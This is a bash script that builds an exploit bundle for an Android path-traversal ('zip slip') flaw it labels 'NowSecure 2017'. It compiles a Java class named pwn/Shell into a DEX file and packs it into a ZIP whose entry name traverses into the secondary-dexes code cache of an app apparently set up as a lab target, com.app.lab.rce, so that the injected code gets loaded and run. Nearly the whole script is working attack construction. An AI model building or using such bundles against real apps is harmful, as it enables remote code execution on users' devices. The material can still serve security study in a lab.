#!/bin/bash

# NowSecure 2017 Vulnerability Exploit Builder
# Creates malicious ZIP with path traversal entries

set -e

echo "[+] Building NowSecure 2017 exploit payload..."

# Android SDK paths
ANDROID_HOME="${ANDROID_HOME:-$HOME/Library/Android/sdk}"
ANDROID_JAR="$ANDROID_HOME/platforms/android-34/android.jar"
BUILD_TOOLS="$ANDROID_HOME/build-tools/34.0.0"
D8="$BUILD_TOOLS/d8"

if [ ! -f "$ANDROID_JAR" ]; then
    echo "[-] Error: Android SDK not found at $ANDROID_JAR"
    echo "    Please set ANDROID_HOME or install Android SDK"
    exit 1
fi

if [ ! -f "$D8" ]; then
    echo "[-] Error: d8 tool not found at $D8"
    echo "    Please install Android build tools"
    exit 1
fi

# Clean previous builds
rm -rf payload/bin exploit_bundle.zip

# Compile Java payload
echo "[+] Compiling Java payload..."
mkdir -p payload/bin
javac -cp "$ANDROID_JAR" -d payload/bin payload/src/pwn/Shell.java

# Create DEX from compiled classes
echo "[+] Creating DEX file..."
cd payload/bin
"$D8" --lib "$ANDROID_JAR" --min-api 16 --output . pwn/Shell.class

# Create classes2.zip containing the DEX
echo "[+] Creating classes2.zip..."
zip -q classes2.zip classes.dex

cd ../..

# Create exploit bundle with path traversal entry
echo "[+] Creating exploit bundle with path traversal..."
python3 -c "
import zipfile
import os

# Create the exploit bundle
with zipfile.ZipFile('exploit_bundle.zip', 'w') as zf:
    # Add the classes2.zip with path traversal name
    path_traversal_name = '../../../../data/data/com.app.lab.rce/code_cache/secondary-dexes/com.app.lab.rce-classes2.zip'
    zf.write('payload/bin/classes2.zip', path_traversal_name)

print('[+] Path traversal entry added successfully')
"

# Verify exploit bundle
if [ -f exploit_bundle.zip ]; then
    SIZE=$(stat -f%z exploit_bundle.zip 2>/dev/null || stat -c%s exploit_bundle.zip)
    echo "[+] Exploit bundle created: exploit_bundle.zip (${SIZE} bytes)"
    echo "[+] Contents:"
    unzip -l exploit_bundle.zip
else
    echo "[-] Error: exploit_bundle.zip not created"
    exit 1
fi

echo "[+] Build complete!"
